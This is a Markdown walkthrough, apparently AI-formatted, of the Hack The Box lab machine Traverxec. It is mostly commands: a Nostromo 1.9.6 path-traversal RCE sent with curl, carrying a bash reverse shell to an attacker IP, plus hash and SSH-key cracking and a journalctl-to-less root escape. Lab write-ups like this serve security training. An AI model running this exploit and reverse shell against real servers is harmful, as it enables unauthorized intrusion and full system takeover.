Here's a clean, organized **Markdown walkthrough** for **HTB: Traverxec**, grouped by exploitation stage with all essential commands and insights:

---

# 🧠 HTB: Traverxec — Walkthrough

**OS:** Linux  
**Difficulty:** Easy  
**Tags:** `nostromo`, `webshell`, `sudo journalctl`, `ssh key`, `GTFObins`

---

## 📡 Recon

### Full TCP Scan

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.165
```

### Script & Version Scan

```bash
nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.165
```

- **Ports:** 22 (OpenSSH 7.9p1), 80 (Nostromo 1.9.6)
- **Likely OS:** Debian Buster

---

## 🌐 [Web Enumeration](HTTP)

### Web Content

- Default page for **web designer**
- Server: `nostromo 1.9.6` (from HTTP headers)

### Vulnerability Search

```bash
searchsploit nostromo
```

✅ Metasploit RCE found for Nostromo 1.9.6

---

## 🐚 Shell as www-data

### Manual Exploit via Curl

```bash
curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' \
-d '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
```

### Listener

```bash
nc -lvnp 443
```

✅ Reverse shell as `www-data`

---

## 👤 Priv Esc: www-data → david

### Found htpasswd file

```bash
cat /var/nostromo/conf/.htpasswd
# david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

### Crack with Hashcat

```bash
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --username
# Password: Nowonly4me
```

### Found Homedirs Setting

```bash
cat /var/nostromo/conf/nhttpd.conf
# homedirs /home
# homedirs_public public_www
```

Check:

```bash
ls /home/david/public_www/protected-file-area/
```

✅ Found: `backup-ssh-identity-files.tgz`

### Download via HTTP Auth

```bash
wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz
tar -xzf backup-ssh-identity-files.tgz
```

Contains: Encrypted SSH key for david

### Crack [SSH](SSH) Key

```bash
/opt/john/run/ssh2john.py id_rsa > id_rsa.john
john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
# Passphrase: hunter

# Save decrypted key:
openssl rsa -in id_rsa -out id_rsa_david
```

### SSH in as david

```bash
ssh -i id_rsa_david david@10.10.10.165
```

📄 `cat user.txt`

---

## 🔓 Priv Esc: david → root

### Found sudo usage in script

```bash
cat ~/bin/server-stats.sh
# Calls: sudo /usr/bin/journalctl -n5 -unostromo.service
```

### Exploit with GTFObins

- **Shrink terminal window**
- Run:

```bash
sudo /usr/bin/journalctl -n5 -unostromo.service
```

- While in less:
```bash
!/bin/bash
```

✅ Root shell!

📄 `cat /root/root.txt`
